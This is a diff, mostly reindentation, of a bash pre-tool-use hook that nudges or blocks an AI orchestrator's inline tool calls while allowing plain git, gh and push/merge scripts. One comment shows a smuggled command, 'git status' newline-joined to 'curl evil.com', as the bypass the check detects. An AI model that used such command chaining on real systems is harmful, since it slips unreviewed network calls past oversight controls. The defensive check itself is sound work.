@@ -32,7 +32,7 @@
 # every workflow command assume this). A hard top-level block would also stop
 # the orchestrator from ever completing the workflow chain that ships this
 # very hook. So, mirroring this repo's existing opt-in postures
-# (test_gate.sh is opt-in-only; remember_inject_cap_guard.sh writes nothing
+# (test_gate.py is opt-in-only; remember_inject_cap_guard.sh writes nothing
 # unless AUTOWRITE=1):
 #   default   -> NUDGE ONLY: additionalContext warns that this tool call is
 #                running inline in the top-level session and suggests
@@ -80,7 +80,7 @@
 IFS= read -r -d '' -t 5 input || true
 
 LOG_FILE="${CLAUDE_DISCIPLINE_LOG:-$HOME/.claude/discipline.log}"
-log_line() { printf '%s %s\n' "$(date -Iseconds 2>/dev/null || date +%Y-%m-%dT%H:%M:%S%z)" "$1" >> "$LOG_FILE" 2>/dev/null; }
+log_line() { printf '%s %s\n' "$(date -Iseconds 2>/dev/null || date +%Y-%m-%dT%H:%M:%S%z)" "$1" >>"$LOG_FILE" 2>/dev/null; }
 
 # Fail-open by design: unparseable/empty stdin or a missing tool_name allows
 # silently rather than denying. This hook's matcher covers every top-level
@@ -90,15 +90,15 @@ log_line() { printf '%s %s\n' "$(date -Iseconds 2>/dev/null || date +%Y-%m-%dT%H
 # is still observable in CLAUDE_DISCIPLINE_LOG.
 tool_name=$(printf '%s' "$input" | jq -r '.tool_name // empty' 2>/dev/null)
 if [ -z "$tool_name" ]; then
-  log_line "hook=agent_only_gate decision=allow reason=unparseable_or_missing_tool_name mode=fail-open"
-  exit 0
+    log_line "hook=agent_only_gate decision=allow reason=unparseable_or_missing_tool_name mode=fail-open"
+    exit 0
 fi
 
 agent_id=$(printf '%s' "$input" | jq -r '.agent_id // empty' 2>/dev/null)
 
 # Inside a subagent (agent_id present) -> not the orchestrator, always allow.
 if [ -n "$agent_id" ]; then
-  exit 0
+    exit 0
 fi
 
 # ── Workflow-chain carve-out (both modes — silent, no nudge/deny) ──────────
@@ -116,7 +116,7 @@ fi
 # carve-out command anchored at the start and end.
 cmd=""
 if [ "$tool_name" = "Bash" ]; then
-  cmd=$(printf '%s' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null)
+    cmd=$(printf '%s' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null)
 fi
 carve_out_re='^[[:space:]]*(gh|git|(bash|sh|\./)?[[:space:]]*([^[:space:]]*/)?scripts/(push|merge|post_review|post_evals)\.sh)([[:space:]].*)?$'
 is_carve_out=0
@@ -126,30 +126,30 @@ is_carve_out=0
 # and a newline-joined second command with no metacharacter on either line
 # would otherwise slip through undetected (e.g. "git status\ncurl evil.com").
 case "$cmd" in
-  *$'\n'*) : ;; # newline present -> leave is_carve_out=0, skip further checks
-  *)
+*$'\n'*) : ;; # newline present -> leave is_carve_out=0, skip further checks
+*)
     if [ -n "$cmd" ] && ! printf '%s' "$cmd" | grep -qE '[&;|`<>]|\$\(' && printf '%s' "$cmd" | grep -qE "$carve_out_re"; then
-      is_carve_out=1
+        is_carve_out=1
     fi
     ;;
 esac
 
 if [ "$is_carve_out" -eq 1 ]; then
-  log_line "hook=agent_only_gate decision=silent tool=$tool_name mode=$([ "${AGENT_ONLY_GATE_ENFORCE:-0}" = "1" ] && echo enforce || echo warn) carve_out=1"
-  exit 0
+    log_line "hook=agent_only_gate decision=silent tool=$tool_name mode=$([ "${AGENT_ONLY_GATE_ENFORCE:-0}" = "1" ] && echo enforce || echo warn) carve_out=1"
+    exit 0
 fi
 
 if [ "${AGENT_ONLY_GATE_ENFORCE:-0}" = "1" ]; then
-  log_line "hook=agent_only_gate decision=deny tool=$tool_name mode=enforce"
-  reason="Blocked: '$tool_name' called inline in the top-level orchestrator session. AGENT_ONLY_GATE_ENFORCE=1 requires do-work tool calls to be dispatched to a subagent via the Agent tool instead. If this genuinely is orchestrator-only plumbing (gh/git/scripts/push.sh/merge.sh/post_review.sh/post_evals.sh), it must be the ENTIRE command with no chaining/substitution (&, ;, |, backtick, \$(...), <, >, newline) to match the workflow-chain carve-out — check the command text. Otherwise, dispatch this work via Agent."
-  jq -n --arg r "$reason" '{
+    log_line "hook=agent_only_gate decision=deny tool=$tool_name mode=enforce"
+    reason="Blocked: '$tool_name' called inline in the top-level orchestrator session. AGENT_ONLY_GATE_ENFORCE=1 requires do-work tool calls to be dispatched to a subagent via the Agent tool instead. If this genuinely is orchestrator-only plumbing (gh/git/scripts/push.sh/merge.sh/post_review.sh/post_evals.sh), it must be the ENTIRE command with no chaining/substitution (&, ;, |, backtick, \$(...), <, >, newline) to match the workflow-chain carve-out — check the command text. Otherwise, dispatch this work via Agent."
+    jq -n --arg r "$reason" '{
     hookSpecificOutput: {
       hookEventName: "PreToolUse",
       permissionDecision: "deny",
       permissionDecisionReason: $r
     }
   }'
-  exit 0
+    exit 0
 fi
 
 log_line "hook=agent_only_gate decision=nudge tool=$tool_name mode=warn carve_out=0"
